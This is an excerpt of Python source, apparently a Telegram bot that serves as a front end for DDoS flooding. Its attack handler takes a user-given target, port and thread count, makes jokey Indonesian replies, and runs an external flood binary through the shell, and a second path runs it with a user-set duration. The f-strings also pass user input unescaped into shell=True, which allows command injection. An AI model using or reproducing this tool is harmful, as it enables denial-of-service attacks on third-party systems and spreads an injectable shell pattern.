...
def restart_bot(message):
    if message.from_user.id in ADMINS:
        ...
        time.sleep(2)
        subprocess.run("python3 stx.py", shell=True)
...
def handle_attack(message):
    ...
    try:
        ...
        if thread > 1000:
            bot.reply_to(message, "❌ Error: Kebanyakan ganteng, maks 1000 thread.")
            return
        ...
        # Execute attack (Replace with actual command)
        attack_command = f"./A/B/C/D/E/F/G/H/I/J/K/L/M/N/O/P/Q/R/STX/depstx {target} {port} 120 {thread}"
        bot.reply_to(message, f"🔥 Kamu mau makai {thread} thread ya? 🤔 \n\n🔥 Proses pelan - pelan pak sopir, lagi ngirim nganu {thread} biji ke {target} {port} dalam 69 detik, canda yaa 😂 kirimnya 120 detik aja ya ganteng 🫠")
        subprocess.run(attack_command, shell=True)
    ...
    if user_id in user_state:
        ...
        try:
            ...
            if state['time'] > 600:
                ...
                full_command = f"./A/B/C/D/E/F/G/H/I/J/K/L/M/N/O/P/Q/R/STX/depstx {state['target']} {state['port']} {state['time']} 200"
